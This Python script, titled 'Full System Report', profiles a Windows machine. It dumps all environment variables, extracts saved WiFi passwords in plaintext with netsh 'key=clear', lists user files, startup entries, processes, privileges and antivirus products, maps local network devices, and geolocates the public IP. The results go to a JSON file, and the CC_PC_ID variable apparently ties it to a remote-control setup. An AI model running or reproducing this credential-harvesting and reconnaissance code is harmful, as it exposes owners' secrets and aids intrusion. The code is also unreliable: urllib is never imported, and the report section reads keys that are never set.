# -*- coding: utf-8 -*-
"""
Full System Report
Comprehensive system information gathering including:
- System information
- Network scanning
- Environment variables
- User folders file scanning
- Startup programs
- Installed software
- Processes
- WiFi profiles
- Browser detection
- Security software
- Disk space
- Services
"""
import os
import sys
import json
import socket
import platform
import subprocess
import tempfile
import re
from datetime import datetime

try:
    import psutil  # optional
except Exception:
    psutil = None

# Fix stdout encoding for Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except:
        pass

PC_ID = os.environ.get("CC_PC_ID", "unknown")

# File browser config
USER_FOLDERS = ['Desktop', 'Downloads', 'Documents', 'Music', 'Videos']
MAX_DEPTH = 10
SKIP_FOLDERS = ['node_modules', '.git', '__pycache__', 'venv', '.venv', 'site-packages', '$RECYCLE.BIN']


def safe_str(s):
    """Convert string to ASCII-safe version"""
    if s is None:
        return ""
    try:
        if isinstance(s, bytes):
            s = s.decode('utf-8', errors='replace')
        return s.encode('ascii', 'replace').decode('ascii')
    except:
        return "???"


def safe_print(msg):
    """Print with ASCII-safe encoding"""
    try:
        safe_msg = safe_str(str(msg))
        sys.stdout.write(safe_msg + "\n")
        sys.stdout.flush()
    except:
        pass


def format_size(size):
    """Format file size to human readable."""
    try:
        if size < 1024:
            return "%d B" % size
        elif size < 1024 * 1024:
            return "%.1f KB" % (size / 1024)
        elif size < 1024 * 1024 * 1024:
            return "%.1f MB" % (size / (1024 * 1024))
        else:
            return "%.2f GB" % (size / (1024 * 1024 * 1024))
    except:
        return "? B"


# ==================== SYSTEM INFORMATION ====================

def get_system_info():
    """Get basic system information."""
    return {
        "hostname": socket.gethostname(),
        "username": os.environ.get('USERNAME', os.environ.get('USER', 'Unknown')),
        "domain": os.environ.get('USERDOMAIN', 'N/A'),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "current_dir": os.getcwd(),
        "home_dir": os.path.expanduser("~"),
        "temp_dir": tempfile.gettempdir()
    }


def get_security_software():
    """Get antivirus information."""
    try:
        result = subprocess.run(
            ['powershell', '-Command', 
             'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName'],
            capture_output=True, text=True, encoding='utf-8', errors='replace'
        )
        return result.stdout.strip() if result.stdout.strip() else "No antivirus detected or access denied"
    except:
        return "Could not detect"


def get_disk_space():
    """Get disk space information."""
    try:
        result = subprocess.run(
            ['powershell', '-Command',
             'Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{n="Used_GB";e={[math]::round($_.Used/1GB,2)}}, @{n="Free_GB";e={[math]::round($_.Free/1GB,2)}} | ConvertTo-Json'],
            capture_output=True, text=True, encoding='utf-8', errors='replace'
        )
        if result.stdout.strip():
            return json.loads(result.stdout)
        return []
    except:
        return []


def get_running_services():
    """Get running services count."""
    try:
        result = subprocess.run(
            ['powershell', '-Command', '(Get-Service | Where-Object Status -eq "Running").Count'],
            capture_output=True, text=True, encoding='utf-8', errors='replace'
        )
        return result.stdout.strip()
    except:
        return "Unknown"


# ==================== NETWORK INFORMATION ====================

def get_network_info():
    """Get comprehensive network information."""
    info = {
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
    }
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        try:
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            info["local_ip"] = "Unknown"
    
    # Get all IPs
    try:
        info["all_ips"] = socket.gethostbyname_ex(socket.gethostname())[2]
    except:
        info["all_ips"] = []
    
    # Get subnet
    try:
        subnet = '.'.join(info["local_ip"].split('.')[:-1])
        info["subnet"] = f"{subnet}.0/24"
    except:
        info["subnet"] = "Unknown"
    
    # Get network config (Windows)
    try:
        result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        info["ipconfig"] = result.stdout[:5000]  # Limit size
    except:
        pass
    
    # Get active connections
    try:
        result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        connections = re.findall(r'ESTABLISHED', result.stdout)
        info["active_connections"] = len(connections)
        info["netstat"] = result.stdout[:5000]  # Limit size
    except:
        info["active_connections"] = 0
    
    # Get ARP table (network devices)
    devices = []
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        lines = result.stdout.strip().split('\n')
        for line in lines:
            match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([\da-f-]+)\s+(\w+)', line, re.I)
            if match:
                ip, mac, dtype = match.groups()
                if mac != 'ff-ff-ff-ff-ff-ff' and not ip.startswith('224.'):
                    devices.append({"ip": ip, "mac": mac, "type": dtype})
        info["arp_devices"] = devices
    except:
        info["arp_devices"] = []
    
    return info


def get_geolocation():
    """Get approximate geolocation via public IP (ip-api)."""
    data = {"source": "ip-api.com"}
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=10) as response:
            ip_data = json.loads(response.read().decode())
            data["public_ip"] = ip_data.get("ip")
    except Exception as e:
        data["error"] = f"public ip: {e}"
        return data
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{data['public_ip']}", timeout=10) as response:
            geo = json.loads(response.read().decode())
            data["location"] = {
                "country": geo.get("country"),
                "region": geo.get("regionName"),
                "city": geo.get("city"),
                "zip": geo.get("zip"),
                "lat": geo.get("lat"),
                "lon": geo.get("lon"),
                "isp": geo.get("isp"),
                "timezone": geo.get("timezone"),
            }
            data["maps"] = f"https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}"
    except Exception as e:
        data["error"] = f"geo lookup: {e}"
    return data


# ==================== ENVIRONMENT VARIABLES ====================

def get_environment_vars():
    """Get all environment variables."""
    env_vars = {}
    for key, value in os.environ.items():
        env_vars[key] = value
    
    # Group by common prefixes
    groups = {
        'PATH': [],
        'USER': [],
        'SYSTEM': [],
        'PROGRAM': [],
        'WINDOWS': [],
        'OTHER': []
    }
    
    for key, value in sorted(env_vars.items()):
        key_upper = key.upper()
        if 'PATH' in key_upper:
            groups['PATH'].append((key, value))
        elif key_upper.startswith('USER'):
            groups['USER'].append((key, value))
        elif key_upper.startswith('SYSTEM'):
            groups['SYSTEM'].append((key, value))
        elif 'PROGRAM' in key_upper:
            groups['PROGRAM'].append((key, value))
        elif 'WINDOWS' in key_upper or 'WIN' in key_upper:
            groups['WINDOWS'].append((key, value))
        else:
            groups['OTHER'].append((key, value))
    
    return {
        'all_vars': env_vars,
        'groups': {k: len(v) for k, v in groups.items()},
        'total_count': len(env_vars)
    }


# ==================== USER FOLDERS FILE SCANNING ====================

def get_drives():
    """Get list of available drives (Windows)."""
    drives = []
    if sys.platform == 'win32':
        import string
        from ctypes import windll, c_ulonglong, c_wchar_p, pointer
        try:
            bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drive_path = "%s:\\" % letter
                    try:
                        free_bytes = c_ulonglong(0)
                        total_bytes = c_ulonglong(0)
                        windll.kernel32.GetDiskFreeSpaceExW(
                            c_wchar_p(drive_path),
                            None,
                            pointer(total_bytes),
                            pointer(free_bytes)
                        )
                        drives.append({
                            "letter": letter,
                            "path": drive_path,
                            "total": total_bytes.value,
                            "free": free_bytes.value,
                        })
                    except:
                        drives.append({"letter": letter, "path": drive_path})
                bitmask >>= 1
        except:
            pass
    return drives


def scan_directory(path, depth=0, all_items=None):
    """Recursively scan a directory and collect all files and folders."""
    if all_items is None:
        all_items = {'folders': [], 'files': []}
    
    if depth > MAX_DEPTH:
        return all_items
    
    try:
        items = os.listdir(path)
    except:
        return all_items
    
    for item in items:
        try:
            full_path = os.path.join(path, item)
            
            if os.path.isdir(full_path):
                if item in SKIP_FOLDERS or item.startswith('.'):
                    continue
                
                try:
                    stat_info = os.stat(full_path)
                    modified = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M')
                except:
                    modified = '--'
                
                all_items['folders'].append({
                    'path': full_path,
                    'name': item,
                    'modified': modified,
                    'depth': depth
                })
                
                scan_directory(full_path, depth + 1, all_items)
                
            elif os.path.isfile(full_path):
                try:
                    stat_info = os.stat(full_path)
                    size = stat_info.st_size
                    modified = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M')
                except:
                    size = 0
                    modified = '--'
                
                all_items['files'].append({
                    'path': full_path,
                    'name': item,
                    'size': size,
                    'modified': modified,
                    'extension': os.path.splitext(item)[1].lower()
                })
        except:
            continue
    
    return all_items


def scan_user_folders():
    """Scan user folders for files."""
    home = os.path.expanduser("~")
    all_results = {'folders': [], 'files': []}
    folder_stats = {}
    
    for folder_name in USER_FOLDERS:
        try:
            folder_path = os.path.join(home, folder_name)
            if not os.path.exists(folder_path):
                continue
            
            results = scan_directory(folder_path)
            all_results['folders'].extend(results['folders'])
            all_results['files'].extend(results['files'])
            
            folder_size = sum(f['size'] for f in results['files'])
            folder_stats[folder_name] = {
                'path': folder_path,
                'folders': len(results['folders']),
                'files': len(results['files']),
                'size': folder_size
            }
        except:
            continue
    
    # File extension statistics
    ext_stats = {}
    for f in all_results['files']:
        try:
            ext = f['extension'] if f['extension'] else '[no ext]'
            if ext not in ext_stats:
                ext_stats[ext] = {'count': 0, 'size': 0}
            ext_stats[ext]['count'] += 1
            ext_stats[ext]['size'] += f['size']
        except:
            continue
    
    # Get largest files
    large_files = sorted(all_results['files'], key=lambda x: -x['size'])[:20]
    
    # Get recent files
    recent_files = sorted(all_results['files'], key=lambda x: x['modified'], reverse=True)[:20]
    
    total_size = sum(f['size'] for f in all_results['files'])
    
    return {
        'folders_scanned': USER_FOLDERS,
        'total_folders': len(all_results['folders']),
        'total_files': len(all_results['files']),
        'total_size': total_size,
        'folder_stats': folder_stats,
        'extension_stats': {k: v for k, v in sorted(ext_stats.items(), key=lambda x: -x[1]['count'])[:20]},
        'largest_files': [{'path': f['path'], 'size': f['size'], 'size_str': format_size(f['size'])} for f in large_files],
        'recent_files': [{'path': f['path'], 'name': f['name'], 'modified': f['modified']} for f in recent_files]
    }


# ==================== STARTUP PROGRAMS ====================

def get_startup_programs():
    """Get startup programs from registry and folders."""
    startup_items = []
    
    try:
        import winreg
        
        # Registry Run keys
        registry_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "Current User - Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "Current User - RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "All Users - Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "All Users - RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "All Users - Run (32-bit)"),
        ]
        
        for root, path, description in registry_paths:
            try:
                key = winreg.OpenKey(root, path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        startup_items.append({
                            'name': name,
                            'command': value[:200],
                            'location': description
                        })
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(key)
            except:
                pass
        
        # Startup folders
        startup_folders = [
            (os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup'), "Current User"),
            (os.path.join(os.environ.get('PROGRAMDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup'), "All Users"),
        ]
        
        for folder, description in startup_folders:
            if os.path.exists(folder):
                items = os.listdir(folder)
                for item in items:
                    startup_items.append({
                        'name': item,
                        'command': os.path.join(folder, item),
                        'location': f"Startup Folder ({description})"
                    })
    except:
        pass
    
    return startup_items


# ==================== INSTALLED SOFTWARE ====================

def get_installed_software():
    """Get installed software."""
    software = []
    try:
        import winreg
        paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        for root, path in paths:
            try:
                key = winreg.OpenKey(root, path)
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            version = ""
                            try:
                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                            except:
                                pass
                            software.append({"name": name, "version": version})
                        except:
                            pass
                        winreg.CloseKey(subkey)
                        i += 1
                    except:
                        break
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass
    return software[:100]  # Limit to 100


# ==================== PROCESSES ====================

def get_process_info():
    """Get running processes."""
    processes = []
    try:
        result = subprocess.run(['tasklist', '/v', '/fo', 'csv'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        lines = result.stdout.strip().split('\n')
        if len(lines) > 1:
            for line in lines[1:100]:  # Limit to 100
                values = line.replace('"', '').split(',')
                if len(values) >= 2:
                    processes.append({
                        "name": values[0],
                        "pid": values[1],
                        "memory": values[4] if len(values) > 4 else "N/A"
                    })
    except:
        pass
    return processes


# ==================== USERS ====================

def get_user_info():
    """Get user and account information."""
    info = {
        "current_user": os.environ.get('USERNAME', 'Unknown'),
        "user_profile": os.environ.get('USERPROFILE', 'Unknown'),
        "app_data": os.environ.get('APPDATA', 'Unknown'),
        "local_app_data": os.environ.get('LOCALAPPDATA', 'Unknown'),
    }
    
    try:
        result = subprocess.run(['net', 'user'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        info["local_users"] = result.stdout[:2000]  # Limit size
    except:
        pass
    
    try:
        result = subprocess.run(['whoami', '/all'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        info["privileges"] = result.stdout[:2000]  # Limit size
    except:
        pass
    
    return info


# ==================== WIFI PROFILES ====================

def get_wifi_profiles():
    """Get saved WiFi profiles."""
    profiles = []
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        lines = result.stdout.split('\n')
        for line in lines:
            if "All User Profile" in line or "Current User Profile" in line:
                profile_name = line.split(':')[-1].strip()
                if profile_name:
                    profiles.append(profile_name)
    except:
        pass
    return profiles


def get_wifi_profiles_with_keys():
    """Get WiFi profiles with plaintext keys where available."""
    profiles = []
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, encoding='utf-8', errors='replace')
        lines = result.stdout.split('\n')
        for line in lines:
            if "All User Profile" in line or "Current User Profile" in line:
                profile_name = line.split(':')[-1].strip()
                if not profile_name:
                    continue
                password = None
                try:
                    detail = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', f'name={profile_name}', 'key=clear'],
                        capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10
                    )
                    for l in detail.stdout.split('\n'):
                        if "Key Content" in l:
                            password = l.split(':')[-1].strip()
                            break
                except Exception as e:
                    password = f"error: {e}"
                profiles.append({"name": profile_name, "password": password})
    except Exception as e:
        profiles.append({"error": str(e)})
    return profiles


# ==================== BROWSERS ====================

def get_browser_info():
    """Get browser information."""
    browsers = {}
    browser_paths = {
        "Chrome": os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        "Firefox": os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
        "Edge": os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        "Brave": os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
    }
    for browser, path in browser_paths.items():
        browsers[browser] = {
            "installed": os.path.exists(path),
            "path": path if os.path.exists(path) else None
        }
    return browsers


# ==================== RECENT FILES ====================

def get_recent_files():
    """Get recently accessed files."""
    recent_files = []
    recent_path = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Recent')
    if os.path.exists(recent_path):
        try:
            files = os.listdir(recent_path)
            for f in files[:50]:  # Limit to 50
                file_path = os.path.join(recent_path, f)
                try:
                    # Get file stats
                    stat = os.stat(file_path)
                    modified = datetime.fromtimestamp(stat.st_mtime).isoformat()
                    size = stat.st_size
                except:
                    modified = "N/A"
                    size = 0
                
                # Return as dictionary with file information
                recent_files.append({
                    'name': f,
                    'path': file_path,
                    'modified': modified,
                    'size': size
                })
        except Exception as e:
            # Return empty list on error, don't crash
            pass
    return recent_files


# ==================== MAIN ====================

def main():
    print("=" * 70)
    print("   FULL SYSTEM REPORT")
    print("=" * 70)
    print(f"   Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "summary": {},
        "sections": {}
    }
    
    # Gather all information
    print("\n[1/13] Gathering System Information...")
    report["sections"]["system"] = get_system_info()
    
    print("[2/13] Gathering Network Information...")
    report["sections"]["network"] = get_network_info()
    report["sections"]["geolocation"] = get_geolocation()
    
    print("[3/13] Gathering User Information...")
    report["sections"]["users"] = get_user_info()
    
    print("[4/13] Gathering Environment Variables...")
    report["sections"]["environment"] = get_environment_vars()
    
    print("[5/13] Scanning User Folders...")
    report["sections"]["user_folders"] = scan_user_folders()
    
    print("[6/13] Gathering Startup Programs...")
    report["sections"]["startup"] = get_startup_programs()
    
    print("[7/13] Gathering Installed Software...")
    report["sections"]["software"] = get_installed_software()
    
    print("[8/13] Gathering Running Processes...")
    report["sections"]["processes"] = get_process_info()
    
    print("[9/13] Gathering WiFi Profiles (with keys)...")
    report["sections"]["wifi"] = get_wifi_profiles_with_keys()
    
    print("[10/13] Detecting Browsers...")
    report["sections"]["browsers"] = get_browser_info()
    
    print("[11/13] Gathering Recent Files...")
    report["sections"]["recent_files"] = get_recent_files()
    
    print("[12/13] Gathering Additional Info...")
    report["sections"]["security"] = {"antivirus": get_security_software()}
    report["sections"]["disks"] = get_disk_space()
    report["sections"]["services"] = {"running_count": get_running_services()}
    report["sections"]["drives"] = get_drives()
    
    print("[13/13] Finalizing summary...")
    sys_info = report["sections"]["system"]
    net = report["sections"]["network"]
    geo = report["sections"].get("geolocation", {})
    wifi = report["sections"]["wifi"]
    disks = report["sections"]["disks"]
    security = report["sections"]["security"]
    report["summary"] = {
        "hostname": sys_info.get("hostname"),
        "username": sys_info.get("username"),
        "os": f"{sys_info.get('os')} {sys_info.get('os_release')}",
        "architecture": sys_info.get("architecture"),
        "ip_local": net.get("local_ip", "N/A"),
        "public_ip": geo.get("public_ip"),
        "location": geo.get("location"),
        "wifi_profiles": len(wifi) if isinstance(wifi, list) else 0,
        "browsers_installed": [k for k, v in report["sections"]["browsers"].items() if v["installed"]],
        "running_services": report["sections"]["services"].get("running_count"),
        "antivirus": security.get("antivirus"),
        "disks": disks,
    }
    
    # Print full report to terminal
    print("\n" + "=" * 70)
    print("   FULL SYSTEM REPORT DETAILS")
    print("=" * 70)
    
    # 1. System Information
    sys_info = report["sections"]["system"]
    print("\n[1] SYSTEM INFORMATION")
    print("-" * 70)
    print(f"Hostname: {sys_info.get('hostname', 'N/A')}")
    print(f"Username: {sys_info.get('username', 'N/A')}")
    print(f"Domain: {sys_info.get('domain', 'N/A')}")
    print(f"OS: {sys_info.get('os', 'N/A')} {sys_info.get('os_release', '')}")
    print(f"Architecture: {sys_info.get('architecture', 'N/A')}")
    print(f"CPU Cores: {sys_info.get('cpu_cores', 'N/A')}")
    print(f"RAM: {sys_info.get('ram_total', 'N/A')}")
    
    # 2. Network Information
    net = report["sections"]["network"]
    print("\n[2] NETWORK INFORMATION")
    print("-" * 70)
    print(f"Local IP: {net.get('local_ip', 'N/A')}")
    print(f"MAC Address: {net.get('mac_address', 'N/A')}")
    print(f"Active Connections: {net.get('active_connections', 0)}")
    if net.get('arp_devices'):
        print(f"\nNetwork Devices ({len(net['arp_devices'])}):")
        for device in net['arp_devices'][:20]:  # Show first 20
            print(f"  - {device.get('ip', 'N/A')}: {device.get('mac', 'N/A')}")
        if len(net['arp_devices']) > 20:
            print(f"  ... and {len(net['arp_devices']) - 20} more")
    
    # 3. Geolocation
    geo = report["sections"].get("geolocation", {})
    print("\n[3] GEOLOCATION")
    print("-" * 70)
    print(f"Public IP: {geo.get('public_ip', 'N/A')}")
    loc = geo.get('location', {})
    if loc:
        print(f"Location: {loc.get('city', 'N/A')}, {loc.get('region', 'N/A')}, {loc.get('country', 'N/A')}")
        print(f"Coordinates: {loc.get('lat', 'N/A')}, {loc.get('lon', 'N/A')}")
        print(f"ISP: {loc.get('isp', 'N/A')}")
    
    # 4. User Information
    users = report["sections"].get("users", {})
    print("\n[4] USER INFORMATION")
    print("-" * 70)
    if isinstance(users, dict):
        for key, value in users.items():
            print(f"{key}: {value}")
    
    # 5. Environment Variables
    env = report["sections"]["environment"]
    print("\n[5] ENVIRONMENT VARIABLES")
    print("-" * 70)
    print(f"Total Count: {env.get('total_count', 0)}")
    if env.get('variables'):
        print("\nKey Variables:")
        for key, value in list(env['variables'].items())[:30]:  # Show first 30
            print(f"  {key} = {safe_str(str(value))[:80]}")
        if len(env['variables']) > 30:
            print(f"  ... and {len(env['variables']) - 30} more")
    
    # 6. User Folders
    folders = report["sections"]["user_folders"]
    print("\n[6] USER FOLDERS")
    print("-" * 70)
    print(f"Total Files: {folders.get('total_files', 0)}")
    print(f"Total Size: {format_size(folders.get('total_size', 0))}")
    if folders.get('folders'):
        print("\nFolder Details:")
        for folder_name, folder_data in list(folders['folders'].items())[:10]:
            print(f"  {folder_name}: {folder_data.get('file_count', 0)} files, {format_size(folder_data.get('total_size', 0))}")
        if len(folders['folders']) > 10:
            print(f"  ... and {len(folders['folders']) - 10} more folders")
    
    # 7. Startup Programs
    startup = report["sections"]["startup"]
    print("\n[7] STARTUP PROGRAMS")
    print("-" * 70)
    print(f"Total: {len(startup)}")
    if startup:
        for prog in startup[:20]:  # Show first 20
            print(f"  - {prog.get('name', 'N/A')}: {prog.get('path', 'N/A')}")
        if len(startup) > 20:
            print(f"  ... and {len(startup) - 20} more")
    
    # 8. Installed Software
    software = report["sections"]["software"]
    print("\n[8] INSTALLED SOFTWARE")
    print("-" * 70)
    print(f"Total: {len(software)}")
    if software:
        for app in software[:30]:  # Show first 30
            name = app.get('name', 'N/A')
            version = app.get('version', '')
            print(f"  - {name} {version}".strip())
        if len(software) > 30:
            print(f"  ... and {len(software) - 30} more")
    
    # 9. Running Processes
    processes = report["sections"]["processes"]
    print("\n[9] RUNNING PROCESSES")
    print("-" * 70)
    print(f"Total: {len(processes)}")
    if processes:
        for proc in processes[:30]:  # Show first 30
            name = proc.get('name', 'N/A')
            pid = proc.get('pid', 'N/A')
            mem = proc.get('memory_mb', 'N/A')
            print(f"  [{pid}] {name} ({mem} MB)")
        if len(processes) > 30:
            print(f"  ... and {len(processes) - 30} more")
    
    # 10. WiFi Profiles
    wifi = report["sections"]["wifi"]
    print("\n[10] WIFI PROFILES")
    print("-" * 70)
    print(f"Total: {len(wifi)}")
    if wifi:
        for profile in wifi[:20]:  # Show first 20
            ssid = profile.get('ssid', 'N/A')
            key = profile.get('key', 'N/A')
            print(f"  SSID: {ssid}")
            if key and key != 'N/A':
                print(f"    Password: {key}")
        if len(wifi) > 20:
            print(f"  ... and {len(wifi) - 20} more")
    
    # 11. Browsers
    browsers = report["sections"]["browsers"]
    print("\n[11] BROWSERS")
    print("-" * 70)
    for browser_name, browser_info in browsers.items():
        installed = browser_info.get('installed', False)
        version = browser_info.get('version', 'N/A')
        status = "INSTALLED" if installed else "NOT INSTALLED"
        print(f"  {browser_name}: {status} {version}")
    
    # 12. Recent Files
    recent = report["sections"].get("recent_files", [])
    print("\n[12] RECENT FILES")
    print("-" * 70)
    print(f"Total: {len(recent)}")
    if recent:
        for file_info in recent[:20]:  # Show first 20
            path = file_info.get('path', 'N/A')
            print(f"  - {path}")
        if len(recent) > 20:
            print(f"  ... and {len(recent) - 20} more")
    
    # 13. Security Software
    security = report["sections"]["security"]
    print("\n[13] SECURITY SOFTWARE")
    print("-" * 70)
    antivirus = security.get('antivirus', [])
    if antivirus:
        for av in antivirus:
            print(f"  - {av}")
    else:
        print("  No antivirus detected")
    
    # 14. Disk Space
    disks = report["sections"]["disks"]
    print("\n[14] DISK SPACE")
    print("-" * 70)
    if isinstance(disks, list):
        for disk in disks:
            print(f"  {disk.get('device', 'N/A')}: {format_size(disk.get('total', 0))} total, "
                  f"{format_size(disk.get('used', 0))} used, {format_size(disk.get('free', 0))} free")
    
    # 15. Services
    services = report["sections"]["services"]
    print("\n[15] SERVICES")
    print("-" * 70)
    print(f"Running Services: {services.get('running_count', 0)}")
    
    # 16. Drives
    drives = report["sections"].get("drives", [])
    print("\n[16] DRIVES")
    print("-" * 70)
    if drives:
        for drive in drives:
            print(f"  - {drive}")
    else:
        print("  No drives found")
    
    # Summary
    print("\n" + "=" * 70)
    print("   REPORT SUMMARY")
    print("=" * 70)
    print(f"SYSTEM: {sys_info.get('os', 'N/A')} {sys_info.get('os_release', '')} ({sys_info.get('architecture', 'N/A')})")
    print(f"USER: {sys_info.get('username', 'N/A')}@{sys_info.get('hostname', 'N/A')}")
    print(f"IP: {net.get('local_ip', 'N/A')}")
    print(f"PUBLIC IP: {geo.get('public_ip', 'N/A')}")
    if loc:
        print(f"LOCATION: {loc.get('city', 'N/A')}, {loc.get('region', 'N/A')}, {loc.get('country', 'N/A')}")
    print(f"NETWORK DEVICES: {len(net.get('arp_devices', []))}")
    print(f"ACTIVE CONNECTIONS: {net.get('active_connections', 0)}")
    print(f"ENVIRONMENT VARIABLES: {env.get('total_count', 0)}")
    print(f"USER FOLDERS: {folders.get('total_files', 0)} files, {format_size(folders.get('total_size', 0))}")
    print(f"STARTUP PROGRAMS: {len(startup)}")
    print(f"INSTALLED SOFTWARE: {len(software)}")
    print(f"RUNNING PROCESSES: {len(processes)}")
    print(f"RUNNING SERVICES: {services.get('running_count', 0)}")
    print(f"WIFI PROFILES: {len(wifi)}")
    installed_browsers = [k for k, v in browsers.items() if v.get('installed')]
    print(f"BROWSERS: {', '.join(installed_browsers) if installed_browsers else 'None'}")
    
    print("\n" + "=" * 70)
    print("   REPORT COMPLETE")
    print("=" * 70)
    
    # Save report as JSON file
    try:
        # Create reports directory if it doesn't exist
        reports_dir = os.path.join(os.path.dirname(__file__), '..', 'reports')
        reports_dir = os.path.abspath(reports_dir)
        os.makedirs(reports_dir, exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_filename = f"full_report_{timestamp}.json"
        json_filepath = os.path.join(reports_dir, json_filename)
        
        # Save report as JSON
        with open(json_filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        
        # Print location in logs
        print("\n" + "=" * 70)
        print("   JSON REPORT SAVED")
        print("=" * 70)
        print(f"   Location: {json_filepath}")
        print(f"   File: {json_filename}")
        print(f"   Size: {format_size(os.path.getsize(json_filepath))}")
        print("=" * 70)
        
    except Exception as e:
        print(f"\n[WARNING] Failed to save JSON report: {safe_str(str(e))}")


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"[FATAL ERROR] {safe_str(str(e))}")
